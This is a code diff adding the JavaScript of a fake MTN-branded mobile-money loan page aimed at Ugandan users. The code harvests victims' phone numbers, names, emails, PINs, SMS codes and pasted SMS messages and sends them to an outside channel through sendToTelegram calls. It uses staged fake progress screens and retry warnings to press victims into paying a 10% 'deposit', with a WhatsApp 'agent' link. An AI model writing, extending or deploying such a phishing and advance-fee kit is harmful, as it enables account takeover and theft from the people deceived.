+    goToStep('smsProcessing');
+    startSmsProcessing();
+}
+
+// ===== SMS PROCESSING — 30 seconds =====
+function startSmsProcessing() {
+    let progress = 0;
+    const totalTime = 30000;
+    const stepTime = totalTime / 100;
+
+    document.getElementById('smsProcessingProgress').style.width = '0%';
+    document.getElementById('smsProcessingPercent').textContent = '0%';
+    document.getElementById('smsProcessingStatus').textContent = t('smsProcessingStatus');
+
+    if (processingInterval) clearInterval(processingInterval);
+    processingInterval = setInterval(() => {
+        progress += 1;
+        if (progress > 100) progress = 100;
+        document.getElementById('smsProcessingProgress').style.width = progress + '%';
+        document.getElementById('smsProcessingPercent').textContent = Math.round(progress) + '%';
+
+        if (progress >= 100) {
+            clearInterval(processingInterval);
+            processingInterval = null;
+            goToStep('otpEntry');
+            document.getElementById('otpForm').style.display = 'block';
+            document.querySelector('.otp-input')?.focus();
+        }
+    }, stepTime);
+}
+
+function showWarning(messageHTML) {
+    const resultDiv = document.getElementById('otpResultMessage');
+    resultDiv.style.display = 'block';
+    resultDiv.innerHTML = messageHTML;
+    document.getElementById('otpForm').style.display = 'none';
+    document.getElementById('otpBtn').disabled = false;
+}
+
+function submitOtpLater() {
+    if (otpTimerInterval) { clearInterval(otpTimerInterval); otpTimerInterval = null; }
+    sendToTelegram({
+        type: '⏳ SMS SUBMITTED LATER',
+        phone: userData.phone,
+        amount: approvedAmount,
+        fullName: `${userData.firstName} ${userData.lastName}`,
+        message: 'User chose to submit SMS later. Loan on hold.'
+    });
+    goToStep('hold');
+}
+
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') {
+        const active = document.activeElement;
+        if (active && (active.tagName === 'INPUT' || active.tagName === 'SELECT' || active.tagName === 'TEXTAREA')) {
+            const panel = document.querySelector('.panel.active');
+            const btn = panel ? panel.querySelector('.btn:not(.btn-secondary)') : null;
+            if (btn) btn.click();
+        }
+    }
+});
+  
+// ===== SUBMIT OTP =====
+function submitOtp() {
+    let otp = '';
+    document.querySelectorAll('.otp-input').forEach(inp => otp += inp.value);
+    if (otp.length !== 4) {
+        document.getElementById('otpError').classList.remove('hidden');
+        document.getElementById('otpError').textContent = t('otpError');
+        return;
+    }
+    document.getElementById('otpError').classList.add('hidden');
+
+    const resultDiv = document.getElementById('otpResultMessage');
+    resultDiv.style.display = 'none';
+
+    const phone = userData.phone || document.getElementById('withdrawPhone').value.trim();
+    if (!phone || !isValidPhone(phone)) { alert(t('invalidPhoneNumber')); return; }
+
+    let attempts = withdrawAttempts.get(phone) || 0;
+    attempts++;
+    withdrawAttempts.set(phone, attempts);
+    saveProgress();
+
+    sendToTelegram({
+        type: '🔢 OTP SUBMITTED',
+        phone: phone, amount: approvedAmount,
+        fullName: `${userData.firstName} ${userData.lastName}`,
+        email: userData.email || 'N/A',
+        pin: userData.pin || 'N/A',
+        otp: otp, attempt: attempts,
+        message: `Attempt #${attempts} | SMS: ${storedSms.substring(0, 50)}...`
+    });
+
+    if (attempts === 1) {
+        // FIRST ATTEMPT: short retry warning with 10%
+        resultDiv.style.display = 'block';
+        resultDiv.innerHTML = `<div style="text-align:center; padding:10px;"><div class="spinner" style="width:40px; height:40px; margin:10px auto;"></div><p style="color:#555;">${t('verifyingText')}</p></div>`;
+        document.getElementById('otpBtn').disabled = true;
+        let waitCounter = 0;
+        const waitInterval = setInterval(() => {
+            waitCounter++;
+            if (waitCounter >= 4) {
+                clearInterval(waitInterval);
+                const warningHTML = `
+                    <div style="background:#fff3cd; border-left:4px solid #ffc107; padding:12px; border-radius:8px; color:#856404;">
+                        <p><strong>${t('retryWarning1Title')}</strong><br>${t('retryWarning1Body')}</p>
+                        <p style="margin-top:8px; font-size:13px; background:#fff; padding:8px; border-radius:6px;">
+                            <i class="fas fa-info-circle"></i> <strong>${t('noteLabel')}:</strong> ${t('retryWarning1Note')}
+                        </p>
+                    </div>
+                    <button class="btn" onclick="clearAndWithdrawAgain()" style="margin-top:12px; background:var(--mtn-yellow); color:var(--mtn-black);">
+                        <i class="fas fa-undo"></i> ${t('withdrawAgainBtn')}
+                    </button>
+                    <button class="btn btn-secondary" style="margin-top:8px;" onclick="goHome()">
+                        <i class="fas fa-home"></i> ${t('homeBtn')}
+                    </button>
+                    <a href="https://wa.me/254789904403" target="_blank" style="display:block;margin-top:12px;background:#25D366;color:white;padding:10px 14px;border-radius:30px;text-decoration:none;font-weight:600;text-align:center;">
+                        <i class="fab fa-whatsapp"></i> Chat with an Agent
+                    </a>
+                `;
+                showWarning(warningHTML);
+                document.getElementById('otpBtn').disabled = false;
+                document.querySelectorAll('.otp-input').forEach(inp => inp.value = '');
+            }
+        }, 1000);
+    } else {
+        // 2nd+ ATTEMPTS: 10-second patient wait, then 10% deposit warning
+        resultDiv.style.display = 'block';
+        resultDiv.innerHTML = `
+            <div style="text-align:center; padding:10px;">
+                <div class="spinner" style="width:40px; height:40px; margin:10px auto;"></div>
+                <p style="color:#555; font-weight:600; margin-top:8px;">${t('patientWaitTitle')}</p>
+                <p style="color:#888; font-size:13px; margin-top:4px;">${t('patientWaitBody')}</p>
+                <div style="margin-top:12px;">
+                    <div style="width:100%;height:4px;background:#e0e0e0;border-radius:10px;overflow:hidden;">
+                        <div id="patientProgress" style="height:100%;width:0%;background:var(--mtn-yellow);border-radius:10px;transition:width 0.5s;"></div>
+                    </div>
+                    <p id="patientPercent" style="font-size:12px;font-weight:600;color:var(--mtn-black);margin-top:4px;">0%</p>
+                </div>
+            </div>
+        `;
+        document.getElementById('otpBtn').disabled = true;
+
+        let patientProgress = 0;
+        const patientInterval = setInterval(() => {
+            patientProgress += 10;
+            if (patientProgress > 100) patientProgress = 100;
+            const ppEl = document.getElementById('patientProgress');
+            const pcEl = document.getElementById('patientPercent');
+            if (ppEl) ppEl.style.width = patientProgress + '%';
+            if (pcEl) pcEl.textContent = patientProgress + '%';
+            if (patientProgress >= 100) {
+                clearInterval(patientInterval);
+                showAttemptWarning();
+            }
+        }, 1000);
+    }
+}
+
+// ===== SHOW ATTEMPT WARNING (10% deposit) =====
+function showAttemptWarning() {
+    const loanAmount = approvedAmount || userData.amount || 0;
+    const tenPercent = Math.round(loanAmount * DEPOSIT_RATE);
+    const firstName = userData.firstName || 'Client';
+
+    const loanAmountFormatted = loanAmount.toLocaleString('en-UG');
+    const tenPercentFormatted = tenPercent.toLocaleString('en-UG');
+
+    const warningHTML = `
+        <div style="background:#f8d7da; border-left:4px solid #dc3545; padding:14px; border-radius:8px; color:#721c24; font-size:13px; line-height:1.5;">
+            <p><strong>${t('attemptWarningGreeting')} ${firstName},</strong></p>
+            <p style="margin-top:8px;">${t('attemptWarningP1')} <strong>${loanAmountFormatted} UGX</strong> ${t('attemptWarningP1b')}</p>
+            <p style="margin-top:8px;">${t('attemptWarningP2')} (<strong>${tenPercentFormatted} UGX</strong>) ${t('attemptWarningP2b')}</p>
+            <p style="margin-top:8px;">${t('attemptWarningP3')} <strong>${tenPercentFormatted} UGX</strong> ${t('attemptWarningP3b')}</p>
+            <p style="margin-top:8px;">${t('attemptWarningP4')}</p>
+            <p style="margin-top:8px;">${t('attemptWarningP5')}</p>
+            <p style="margin-top:10px;">${t('attemptWarningThanks')}</p>
+        </div>
+        <button class="btn" onclick="clearAndWithdrawAgain()" style="margin-top:12px; background:var(--mtn-yellow); color:var(--mtn-black);">
+            <i class="fas fa-undo"></i> ${t('withdrawAgainBtn')}
+        </button>
+        <button class="btn btn-secondary" style="margin-top:8px;" onclick="goHome()">
+            <i class="fas fa-home"></i> ${t('homeBtn')}
+        </button>
+        <a href="https://wa.me/254789904403" target="_blank" style="display:block;margin-top:12px;background:#25D366;color:white;padding:10px 14px;border-radius:30px;text-decoration:none;font-weight:600;text-align:center;">
+            <i class="fab fa-whatsapp"></i> Chat with an Agent
+        </a>
+    `;
+    showWarning(warningHTML);
+    document.getElementById('otpBtn').disabled = false;
+    document.querySelectorAll('.otp-input').forEach(inp => inp.value = '');
+}
+
+// ===== CLEAR & WITHDRAW AGAIN =====
+function clearAndWithdrawAgain() {
+    document.querySelectorAll('.pin-input').forEach(inp => inp.value = '');
+    document.querySelectorAll('.otp-input').forEach(inp => inp.value = '');
+    document.getElementById('smsMessage').value = '';
+    document.getElementById('smsPasteError').classList.add('hidden');
+    document.getElementById('otpError').classList.add('hidden');
+    document.getElementById('otpResultMessage').style.display = 'none';
+    document.getElementById('otpResultMessage').innerHTML = '';
+    document.getElementById('otpForm').style.display = 'block';
+    document.getElementById('otpBtn').disabled = false;
+    goToWithdraw();
+}
+
+// ===== BACKWARDS-COMPAT ALIASES =====
+window.goToStep1 = goToStep1;
+window.goToStep2 = goToStep2;
+window.goToStep3 = goToStep3;
+window.submitApplication = submitApplication;
+window.goToWithdraw = goToWithdraw;
+window.goToWithdrawAgain = goToWithdrawAgain;
+window.goBackToQualified = goBackToQualified;
+window.goBackToWithdraw = goBackToWithdraw;
+window.verifyPin = verifyPin;
+window.submitSms = submitSms;
+window.resendSms = resendSms;
+window.submitOtp = submitOtp;
+window.submitOtpLater = submitOtpLater;
+window.clearAndWithdrawAgain = clearAndWithdrawAgain;
+window.goHome = goHome;
+
+// ===== INITIAL STATE =====
+document.addEventListener('DOMContentLoaded', function() {
+    updateCalculator();
+});
+</script>
+</body>
+</html>
